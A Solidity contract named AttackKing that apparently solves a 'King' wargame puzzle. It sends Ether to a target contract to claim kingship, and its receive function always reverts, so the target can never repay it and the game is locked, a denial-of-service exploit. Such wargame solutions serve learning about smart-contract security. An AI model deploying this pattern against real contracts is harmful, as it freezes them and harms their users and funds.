// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    address public kingContract;

    // Pass the King contract's address to the constructor
    constructor(address _kingContract) {
        kingContract = _kingContract;
    }

    // Fallback function that does not accept Ether
    receive() external payable {
        revert("Cannot claim Ether");
    }

    // Function to claim kingship
    function claimKingship() public payable {
        // Send enough Ether to become the king
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "Failed to claim kingship");
    }
}
